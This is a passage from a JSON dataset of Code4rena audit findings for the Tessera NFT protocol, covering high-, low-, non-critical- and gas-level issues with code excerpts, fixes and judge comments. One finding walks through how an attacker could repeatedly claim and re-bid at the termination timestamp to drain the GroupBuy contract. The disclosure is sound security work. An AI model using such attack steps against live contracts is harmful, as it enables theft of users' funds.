is not `without maintenance or interruption`.\n\n### Recommended Mitigation Steps\n\nAlways reset the approval to zero before changing it to the maximum.\n\n**[mehtaculous (Tessera) disputed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/37#issuecomment-1370188871):**\n > Disagree with approval issue since the conduit will not be able to front-run the approvals.\n> \n> However, the issue regarding the conduit as an immutable variable is valid and it seems that a solution would be to pass the conduit in as a parameter for every `validateListing` call.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/37#issuecomment-1378841205):**\n > The issue here isn't about the frontrunning attack vector, but about not being able to reset the approval back to the maximum because some token implementations require the allowance can only be set to non-zero from zero, ie. non-zero -> non-zero is disallowed.\n> \n> Meaning, once the allowance is partially used, subsequent attempts to approve back to `type(uint256).max` will fail.\n\n**[stevennevins (Tessera) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/37#issuecomment-1420884653):**\n > I think this title is mislabeled and they meant SeaportOL.  The Vault delegate calls to the Seaport Lister so these approvals would be scoped to the Vault so multiple listing are possible through the target contract.  But a vault that relists wouldn't be able to relist an ERC20 with front running protection.\n\n\n\n***\n\n",
      "summary": "\nThis report reveals a bug in the SeaportLister smart contract, which is used to list items for sale on the Tessera Protocol. The bug occurs when the `approve()` function is called without first calling `approve(0)`, which can cause certain tokens, such as Tether, to revert. This bug affects all tokens that are trying to protect against a specific attack. The impact of this bug is that only the first listing on the SeaportLister will work, and all subsequent attempts to approve the same token will fail, causing any orders using this lister to also fail. The proof of concept provided shows that the conduit address is set as an immutable variable, so it cannot be changed once the issue is hit. The recommended mitigation steps are to always reset the approval to zero before changing it to the maximum. However, there is some disagreement among the team members about whether this is a valid issue or not. The bug report also mentions that the Tessera Protocol is designed to run without maintenance or interruption, but having to deploy a new SeaportLister in order to have a fresh conduit goes against this design.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/37",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "43290",
      "title": "[H-07] User loses collateral converted to pendingBalance when `cash()` or `list()` is called",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L295> \n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L232>\n\n### Description\n\nIn OptimisticListingOpensea, there are several functions which update pendingBalances of a proposer:\n\n1.  `list()`\n2.  `cash()`\n3.  `propose()`\n\nUnfortunately, in `list()` and `cash()` the = operator is used instead of += when writing the new pendingBalances. For example:\n\n    function cash(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if vault is not registered\n        (address token, uint256 id) = _verifyVault(_vault);\n        // Reverts if active listing has not been settled\n        Listing storage activeListing = activeListings[_vault];\n        // Reverts if listing has not been sold\n        if (!_verifySale(_vault)) {\n            revert NotSold();\n        } else if (activeListing.collateral != 0) {\n            uint256 collateral = activeListing.collateral;\n            activeListing.collateral = 0;\n            // Sets collateral amount to pending balances for withdrawal\n            pendingBalances[_vault][activeListing.proposer] = collateral;\n        }\n    \t...\n\npendingBalances is not guaranteed to be zero. There could be funds from previous proposals which are not yet collected. Propose updates pendingBalance correctly:\n\n    // Sets collateral amount to pending balances for withdrawal\n    pendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral;\n\nSo, when propose is followed by another propose(), the pendingBalance is updated correctly, but in cash and list we don't account for pre-existing balance. This issue would manifest even after the fix suggested in the issue \"User can send a proposal and instantly take back their collateral\" because reject functions would increment the pendingBalance and then it would be overriden.\n\n### Impact\n\nUser loses collateral converted to pendingBalance when `cash()` or `list()` is called.\n\n### Proof of Concept\n\n1.  User calls `propose()` and gets pendingBalance = x\n2.  User calls `propose()` with an improved proposal and gets pendingBalance = 1.5x\n3.  proposal is successfull and the listing purchased the NFT\n4.  `cash()` is called to convert the Raes to ETH amount from the sell. pendingBalance is overridden by the current \"collateral\"  value. pendingBalance = 0.5x\n5.  User loses x collateral value which is stuck in the contract\n\n### Recommended Mitigation Steps\n\nChange the = operator to += in `list()` and `cash()`.\n\n**[mehtaculous (Tessera) confirmed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/44#issuecomment-1370128040):**\n > Agree with High severity. Solution is to replace `=` with `+=` for both `list` and `cash` functions.\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/44#issuecomment-1404413085):**\n > https://github.com/fractional-company/modular-fractional/pull/202\n >\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/46), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/26), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/8).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue in the OptimisticListingSeaport contract, specifically in the `list()` and `cash()` functions. These functions use the = operator instead of the += operator when updating the pendingBalances of a proposer. This can result in a loss of collateral for the user if they call these functions after making a proposal. The report recommends changing the = operator to += in order to mitigate this issue. The bug has been confirmed and mitigated by the Tessera team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/44",
      "tags": [],
      "finders": [
        "Lambda",
        "Trust"
      ]
    },
    {
      "id": "43289",
      "title": "[H-03] Groupbuy:` _verifyUnsuccessfulState` and `_verifySuccessfulState` both can return true when block.timestamp == pool.terminationPeriod",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L455> \n\n<https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L478>\n\n### Impact\n\nThe functions `_verifyUnsuccessfulState` and `_verifySuccessfulState` should always have a differing behavior with regards to reversion, i.e. when one does not revert, the other should revert. In one condition, this is not true. Namely, when we have `pool.success == false` and `block.timestamp == pool.terminationPeriod`, this check within `_verifyUnsuccessfulState` is `false`:\n\n```solidity\nif (pool.success || block.timestamp > pool.terminationPeriod) revert InvalidState();\n```\n\nSimilarly, this check within `_verifySuccessfulState` is also `false`:\n\n```solidity\nif (!pool.success && block.timestamp < pool.terminationPeriod) revert InvalidState();\n```\n\nBecause this breaks a fundamental invariant of the contract, there are probably multiple ways to exploit it.\nOne way an attacker can exploit is by calling `claim` (to get his contribution back completely), bidding again with a higher value than his previous contributions (to get his contributions back again).\n\n### Proof Of Concept\n\nLet's assume we are at timestamp `pool.terminationPeriod`. Attacker Charlie has performed the lowest bid with quantity 10 and price 1 ETH. He calls `claim` to get his 10 ETH back. Now, he calls `contribute` with a quantity of 10 and a price of 2 ETH. Because this bid is higher than his previous one (which was the lowest one), his `pendingBalances` is set to 10 ETH (for the deleted entries) and his `userContributions` is set to 20 ETH (for this new contribution). He can now call `claim` again to get back his 20 ETH in `userContributions`, but also the 10 ETH in `pendingBalances`. Like that, he has stolen 10 ETH (and could use this attack pattern to drain the whole contract).\n\n### Recommended Mitigation Steps\n\nChange `<` in `_verifySuccessfulState` to `<=`.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/10#issuecomment-1358723568):**\n > Given that block timestamp period for ETH mainnet is now a constant 12s, the probability of a block timestamp being equal to `terminationPeriod` is 1/12 (~8.3%), which is non-trivial.\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/10#issuecomment-1404411546):**\n > https://github.com/fractional-company/modular-fractional/pull/203\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/41), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/22), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/4). \n\n***\n\n",
      "summary": "\nThis bug report is about an issue found in the code for a smart contract called GroupBuy. The problem is that two functions, _verifyUnsuccessfulState and _verifySuccessfulState, should have different behaviors when it comes to reverting (undoing a transaction). However, in one specific condition, they both do not revert, which breaks an important rule of the contract. This could potentially be exploited by an attacker to steal money from the contract. The report includes a proof of concept, which shows how an attacker could use this bug to drain the entire contract. The recommended solution is to make a small change to the code to fix this issue. The team working on the contract has confirmed the issue and implemented the fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/10",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "24526",
      "title": "[N-09]  Large or complicated code bases should implement fuzzing tests",
      "impact": "LOW",
      "content": "Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement [fuzzing tests](https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05). Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n\n```\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/29#issuecomment-1379018752):**\n > Tough one between this and [#4](https://github.com/code-423n4/2022-12-tessera-findings/issues/4) as both contain very useful findings. While I like that #4 has more context specific findings, I decided to go with this one because of the number of findings made and its comprehensiveness.\n> \n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/29#issuecomment-1404417864):**\n > https://github.com/fractional-company/modular-fractional/pull/205\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24525",
      "title": "[N-08]  Contracts should have full test coverage",
      "impact": "LOW",
      "content": "While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24524",
      "title": "[N-07]  Consider using `delete` rather than assigning zero to clear values",
      "impact": "LOW",
      "content": "The `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic.\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: src/modules/GroupBuy.sol\n\n253:                  bid.quantity = 0;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L253\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n293:              activeListing.collateral = 0;\n\n325:          pendingBalances[_vault][_to] = 0;\n\n437:          orderParams.totalOriginalConsiderationItems = 0;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L293\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24523",
      "title": "[N-06]  NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 7 instances of this issue:*\n\n```solidity\nFile: src/modules/GroupBuy.sol\n\n/// @audit Missing: '@return'\n344       /// @param _poolId ID of the pool\n345       /// @param _bidId ID of the bid in queue\n346       function getBidInQueue(uint256 _poolId, uint256 _bidId)\n347           public\n348           view\n349           returns (\n350               uint256 bidId,\n351               address owner,\n352               uint256 price,\n353:              uint256 quantity\n\n/// @audit Missing: '@return'\n363       /// @notice Gets minimum bid price of queue for given pool\n364       /// @param _poolId ID of the pool\n365:      function getMinPrice(uint256 _poolId) public view returns (uint256) {\n\n/// @audit Missing: '@return'\n369       /// @notice Gets next bidId in queue of given pool\n370       /// @param _poolId ID of the pool\n371:      function getNextBidId(uint256 _poolId) public view returns (uint256) {\n\n/// @audit Missing: '@return'\n375       /// @notice Gets total number of bids in queue for given pool\n376       /// @param _poolId ID of the pool\n377:      function getNumBids(uint256 _poolId) public view returns (uint256) {\n\n/// @audit Missing: '@return'\n382       /// @param _poolId ID of the pool\n383       /// @param _bidId ID of the bid in queue\n384:      function getBidQuantity(uint256 _poolId, uint256 _bidId) public view returns (uint256) {\n\n/// @audit Missing: '@return'\n389       /// @param _poolId ID of the pool\n390       /// @param _owner Address of the owner\n391       function getOwnerToBidIds(uint256 _poolId, address _owner)\n392           public\n393           view\n394:          returns (uint256[] memory)\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L344-L353\n\n```solidity\nFile: src/punks/protoforms/PunksMarketBuyer.sol\n\n/// @audit Missing: '@return'\n44        /// @param _order Bytes value of the necessary order parameters\n45        /// return vault Address of the deployed vault\n46:       function execute(bytes memory _order) external payable returns (address vault) {\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/punks/protoforms/PunksMarketBuyer.sol#L44-L46\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24522",
      "title": "[N-05]  Missing event and or timelock for critical parameter change",
      "impact": "LOW",
      "content": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n336       function updateFeeReceiver(address payable _new) external {\n337           if (msg.sender != feeReceiver) revert NotAuthorized();\n338           feeReceiver = _new;\n339:      }\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L336-L339\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24521",
      "title": "[N-04]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n/// @audit 3\n350:          permissions = new Permission[](3);\n\n/// @audit 3\n385:              orderParams.totalOriginalConsiderationItems = 3;\n\n/// @audit 40\n395:          uint256 openseaFees = _listingPrice / 40;\n\n/// @audit 20\n396:          uint256 tesseraFees = _listingPrice / 20;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L350\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24520",
      "title": "[N-03]  `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 10 instances of this issue:*\n\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n27:       function initialize(Queue storage self) public {\n\n36:       function getNumBids(Queue storage self) public view returns (uint256) {\n\n41:       function getMin(Queue storage self) public view returns (Bid storage) {\n\n90:       function delMin(Queue storage self) public returns (Bid memory) {\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L27\n\n```solidity\nFile: src/modules/GroupBuy.sol\n\n346       function getBidInQueue(uint256 _poolId, uint256 _bidId)\n347           public\n348           view\n349           returns (\n350               uint256 bidId,\n351               address owner,\n352               uint256 price,\n353:              uint256 quantity\n\n371:      function getNextBidId(uint256 _poolId) public view returns (uint256) {\n\n377:      function getNumBids(uint256 _poolId) public view returns (uint256) {\n\n384:      function getBidQuantity(uint256 _poolId, uint256 _bidId) public view returns (uint256) {\n\n402:      function printQueue(uint256 _poolId) public view {\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L346-L353\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n218:      function list(address _vault, bytes32[] calldata _listProof) public {\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L218\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24519",
      "title": "[N-02]  Typos",
      "impact": "LOW",
      "content": "\n*There are 4 instances of this issue:*\n\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n/// @audit addreses\n22:           ///@notice map addreses to bids they own\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L22\n\n```solidity\nFile: src/modules/GroupBuy.sol\n\n/// @audit equalt\n179:          // Reverts if NFT contract is not equalt to NFT contract set on pool creation\n\n/// @audit Verifes\n208:              // Verifes vault is owner of ERC-721 token\n\n/// @audit specifc\n286:      /// @notice Attempts to accept bid for specifc quantity and price\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L179\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24518",
      "title": "[N-01]  Debugging functions should be moved to a child class rather than being deployed",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /src/modules/GroupBuy.sol\n\n402      function printQueue(uint256 _poolId) public view {\n403          uint256 counter;\n404          uint256 index = 1;\n405          MinPriorityQueue.Queue storage queue = bidPriorityQueues[_poolId];\n406          uint256 numBids = queue.numBids;\n407          while (counter < numBids) {\n408              Bid memory bid = queue.bidIdToBidMap[index];\n409              if (bid.bidId == 0) {\n410                  ++index;\n411                  continue;\n412              }\n413              ++index;\n414              ++counter;\n415          }\n416:     }\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L402-L416\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24517",
      "title": "[L-05]  Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There are 12 instances of this issue:*\n\n```solidity\nFile: src/punks/protoforms/PunksMarketBuyer.sol\n\n32:           registry = _registry;\n\n33:           wrapper = _wrapper;\n\n34:           listing = _listing;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/punks/protoforms/PunksMarketBuyer.sol#L32\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n71:           registry = _registry;\n\n72:           seaport = _seaport;\n\n73:           zone = _zone;\n\n75:           supply = _supply;\n\n76:           seaportLister = _seaportLister;\n\n77:           feeReceiver = _feeReceiver;\n\n78:           OPENSEA_RECIPIENT = _openseaRecipient;\n\n338:          feeReceiver = _new;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L71\n\n```solidity\nFile: src/seaport/targets/SeaportLister.sol\n\n20:           conduit = _conduit;\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L20\n\n## Non-Critical Issues Summary\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;01] | Debugging functions should be moved to a child class rather than being deployed | 1 | \n| [N&#x2011;02] | Typos | 4 | \n| [N&#x2011;03] | `public` functions not called by the contract should be declared `external` instead | 10 | \n| [N&#x2011;04] | `constant`s should be defined rather than using magic numbers | 4 | \n| [N&#x2011;05] | Missing event and or timelock for critical parameter change | 1 | \n| [N&#x2011;06] | NatSpec is incomplete | 7 | \n| [N&#x2011;07] | Consider using `delete` rather than assigning zero to clear values | 4 | \n| [N&#x2011;08] | Contracts should have full test coverage | 1 | \n| [N&#x2011;09] | Large or complicated code bases should implement fuzzing tests | 1 | \n\nTotal: 33 instances over 9 issues\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24516",
      "title": "[L-04]  `require()` should be used instead of `assert()`",
      "impact": "LOW",
      "content": "Prior to solidity version 0.8.0, hitting an assert consumes the **remainder of the transaction's available gas** rather than returning it, as `require()`/`revert()` do. `assert()` should be avoided even past solidity version 0.8.0 as its [documentation](https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require) states that \"The assert function creates an error of type Panic(uint256). ... Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix\".\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src/seaport/targets/SeaportLister.sol\n\n45:           assert(ConsiderationInterface(_consideration).validate(_orders));\n\n52:           assert(ConsiderationInterface(_consideration).cancel(_orders));\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L45\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24515",
      "title": "[L-03]  Empty `receive()`/`payable fallback()` function does not authorize requests",
      "impact": "LOW",
      "content": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds. If the concern is having to spend a small amount of gas to check the sender against an immutable address, the code should at least have a function to rescue unused Ether.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src/punks/protoforms/PunksMarketBuyer.sol\n\n41:       receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/punks/protoforms/PunksMarketBuyer.sol#L41\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n83:       receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L83\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24514",
      "title": "[L-02]  Users may DOS themselves with a lot of smalle payments",
      "impact": "LOW",
      "content": "If a user has to contribute to a pool via lots of dust payments (e.g. if they only have enough money each week to spend a few wei), they may eventually add enough payments that when it's time to claim their excess, their for-loop below exceeds the block gas limit.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /src/modules/GroupBuy.sol\n\n247          if (success) {\n248              for (uint256 i; i < length; ++i) {\n249                  // Gets bid quantity from storage\n250:                 Bid storage bid = bidPriorityQueues[_poolId].bidIdToBidMap[bidIds[i]];\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L247-L250\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24513",
      "title": "[L-01]  Bid size is an unfair ordering metric",
      "impact": "LOW",
      "content": "The README states that this is intentional, so I've filed it as Low rather than Medium, but giving priority to bids with the smaller quantity is not a fair ordering mechanic. A person with a lot of funds may have gotten that by pooling externally to the contract, and it's not fair to kick them out of the pool earlier than another address that came in later.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /src/lib/MinPriorityQueue.sol\n\n111      function isGreater(\n112          Queue storage self,\n113          uint256 i,\n114          uint256 j\n115      ) private view returns (bool) {\n116          Bid memory bidI = self.bidIdToBidMap[self.bidIdList[i]];\n117          Bid memory bidJ = self.bidIdToBidMap[self.bidIdList[j]];\n118          if (bidI.price == bidJ.price) {\n119              return bidI.quantity <= bidJ.quantity;\n120          }\n121          return bidI.price > bidJ.price;\n122:     }\n\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L111-L122\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "12226",
      "title": "[G-14] Pack Queue Struct",
      "impact": "GAS",
      "content": "\n```solidity\n    struct Queue {\n        ///@notice incrementing bid id\n        uint256 nextBidId;\n        ///@notice array backing priority queue\n        uint256[] bidIdList;\n        ///@notice total number of bids in queue\n        uint256 numBids;\n        //@notice map bid ids to bids\n        mapping(uint256 => Bid) bidIdToBidMap;\n        ///@notice map addreses to bids they own\n        mapping(address => uint256[]) ownerToBidIds;\n    }\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L13-L24)\n\nto\n\n```solidity\n    struct Queue {\n        ///@notice incrementing bid id\n        uint96 nextBidId;\n        ///@notice total number of bids in queue\n        uint160 numBids;\n        ///@notice array backing priority queue\n        uint256[] bidIdList;\n        //@notice map bid ids to bids\n        mapping(uint256 => Bid) bidIdToBidMap;\n        ///@notice map addreses to bids they own\n        mapping(address => uint256[]) ownerToBidIds;\n    }\n```\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/21#issuecomment-1359052085):**\n> I like that [#28](https://github.com/code-423n4/2022-12-tessera-findings/issues/28) states the amount of gas saved per finding and as a whole. However, this report edges out in gas savings IMO, notably with the struct reorderings + doing merkle proof generation off-chain recommendations.\n>\n>*(Note: See [original submission](https://github.com/code-423n4/2022-12-tessera-findings/issues/21) for judge's full commentary.)*\n\n**[mehtaculous (Tessera) confirmed](https://github.com/code-423n4/2022-12-tessera-findings/issues/21#issuecomment-1372587483)**\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-14-pack-queue-struct",
      "tags": [],
      "finders": []
    },
    {
      "id": "12225",
      "title": "[G-13] Pack Bid Struct",
      "impact": "GAS",
